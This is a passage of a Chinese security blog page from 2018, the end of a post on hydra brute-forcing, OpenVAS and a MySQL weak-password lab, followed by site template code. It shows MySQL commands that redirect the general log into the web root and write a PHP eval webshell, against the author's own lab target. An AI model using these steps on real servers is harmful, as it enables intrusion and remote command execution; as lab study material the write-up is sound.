+<h3 id="靶机开放读写的权限，设置secure-file-prive-var-www-html"><a href="#靶机开放读写的权限，设置secure-file-prive-var-www-html" class="headerlink" title="靶机开放读写的权限，设置secure_file_prive=/var/www/html"></a>靶机开放读写的权限，设置<code>secure_file_prive=/var/www/html</code></h3><p>但是现在mysql以及相对安全了许多，默认的值是，并且不允许在运行时修改，这样在利用的时候就显得有些鸡肋。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 限制mysqld的导入和导出，完全禁止出。</span><br><span class="line">mysqld --secure_file_prive=null</span><br><span class="line"># 限制mysqld的导入和导出，只能在特定目录 /tmp/之下</span><br><span class="line">mysqld --secure_file_priv=/tmp/</span><br><span class="line"># 不限制mysqld的导入和导出</span><br><span class="line">在文件/etc/my.cnf中不写 --secure_file_priv</span><br></pre></td></tr></table></figure></p>
+<h3 id="使用mysql日志功能写shell"><a href="#使用mysql日志功能写shell" class="headerlink" title="使用mysql日志功能写shell"></a>使用mysql日志功能写shell</h3><p>在网上看到可以开启日志记录功能，直接修改log的写入文件，就可以传入webshell,网上的教程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = on;  # 开启general log模式</span><br><span class="line">set global general_log_file = &apos;/var/www/html/1.php&apos;;   # 设置日志目录为shell地址</span><br><span class="line">select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;  # 写入shell</span><br></pre></td></tr></table></figure></p>
+<p>但是在具体的实现过程中，发现这个利用也有相当多的限制条件，首先<code>/var/www/html/</code>下必须要有写的权限，其次写入的shell还要能够以apache2运行用户如<code>www-data</code>执行得起来。实操中发现，手动修改了<code>/var/www/html</code> 权限为<code>777</code>的条件下，在linux的环境下菜刀仍旧是连不上。当修改mysql log写入文件如shell.php的权限为<code>777</code>的时候，才可以连得上。但是令人最为费解的地方在于，以root用户身份重新修改了文件权限为原来的620，发现菜刀仍旧可以连得上，难不成这一次修改来回发生了什么不为人知的奥秘？笔者一时解释不清，暂时放在这。慢慢探讨究竟。 </p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.freebuf.com/column/152404.html" target="_blank" rel="noopener">http://www.freebuf.com/column/152404.html</a><br><a href="https://www.cnblogs.com/zhaijiahui/p/8371336.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/8371336.html</a><br><a href="https://www.jianshu.com/p/a4f01fc3a720" target="_blank" rel="noopener">https://www.jianshu.com/p/a4f01fc3a720</a><br><a href="https://blog.csdn.net/qq_15983061/article/details/77892851" target="_blank" rel="noopener">https://blog.csdn.net/qq_15983061/article/details/77892851</a><br><a href="http://blkstone.github.io/2017/12/31/mysql-sqli-to-webshell/" target="_blank" rel="noopener">http://blkstone.github.io/2017/12/31/mysql-sqli-to-webshell/</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+	<div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文标题:</strong>
+    <a href="/2018/08/14/mysql弱密码/">hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    little potato
+  </li>
+  <li class="post-copyright-author">
+    <strong>发布时间:</strong>
+    2018年08月14日 - 01:08
+  </li>
+  <li class="post-copyright-author">
+    <strong>最后更新:</strong>
+    2018年12月05日 - 23:12
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2018/08/14/mysql弱密码/" title="hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建">http://yoursite.com/2018/08/14/mysql弱密码/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/mysql弱密码/" rel="tag"># mysql弱密码</a>
+          
+            <a href="/tags/hydra/" rel="tag"># hydra</a>
+          
+            <a href="/tags/OpenVAS/" rel="tag"># OpenVAS</a>
+          
+            <a href="/tags/webshell/" rel="tag"># webshell</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/12/redis未授权访问/" rel="next" title="redis未授权访问">
+                <i class="fa fa-chevron-left"></i> redis未授权访问
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/05/浅谈php安全/" rel="prev" title="浅谈php安全">
+                浅谈php安全 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/109.jpg" alt="little potato">
+          <p class="site-author-name" itemprop="name">little potato</p>
+           
+              <p class="site-description motion-element" itemprop="description">The true man wants two things:danger and play.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">39</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=857896&auto=0&height=66"></iframe>
+
+<div align="left" font-family:="" "arial","microsoft="" yahei","����","����",sans-serif="">
+
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/IversionBY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:mini.lypto@gmail.com" target="_blank" title="GMail">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  GMail
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/littelpotato" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.xdsec.club/" title="XDSEC" target="_blank">XDSEC</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.anquanquan.info/" title="infor" target="_blank">infor</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.freebuf.com/" title="freebuf" target="_blank">freebuf</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </div></section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hydra"><span class="nav-number">1.</span> <span class="nav-text">hydra</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#参数介绍"><span class="nav-number">1.0.1.</span> <span class="nav-text">参数介绍</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#OpenVAS"><span class="nav-number">2.</span> <span class="nav-text">OpenVAS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kali-2-0"><span class="nav-number">2.0.1.</span> <span class="nav-text">Kali 2.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fedora"><span class="nav-number">2.0.2.</span> <span class="nav-text">fedora</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#安装"><span class="nav-number">2.0.2.0.0.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#启动"><span class="nav-number">2.0.2.0.0.2.</span> <span class="nav-text">启动</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#docker"><span class="nav-number">2.0.3.</span> <span class="nav-text">docker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mysql弱密码环境配置"><span class="nav-number">3.</span> <span class="nav-text">mysql弱密码环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql设置远程访问"><span class="nav-number">3.0.1.</span> <span class="nav-text">mysql设置远程访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iptables-端口放行"><span class="nav-number">3.0.2.</span> <span class="nav-text">iptables 端口放行</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞验证"><span class="nav-number">4.</span> <span class="nav-text">漏洞验证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hydra爆破"><span class="nav-number">4.0.1.</span> <span class="nav-text">hydra爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OpenVAS扫描"><span class="nav-number">4.0.2.</span> <span class="nav-text">OpenVAS扫描</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#登陆mysql后参数查看与信息搜集"><span class="nav-number">5.0.1.</span> <span class="nav-text">登陆mysql后参数查看与信息搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql文件操作传shell"><span class="nav-number">5.0.2.</span> <span class="nav-text">mysql文件操作传shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#靶机开放读写的权限，设置secure-file-prive-var-www-html"><span class="nav-number">5.0.3.</span> <span class="nav-text">靶机开放读写的权限，设置secure_file_prive=/var/www/html</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用mysql日志功能写shell"><span class="nav-number">5.0.4.</span> <span class="nav-text">使用mysql日志功能写shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">little potato</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://iversion lee.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yoursite.com/2018/08/14/mysql弱密码/';
+          this.page.identifier = '2018/08/14/mysql弱密码/';
+          this.page.title = 'hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://iversion lee.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "a1fe7273de6e47ad9f9802a493c2cccf",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+</div></body></html>
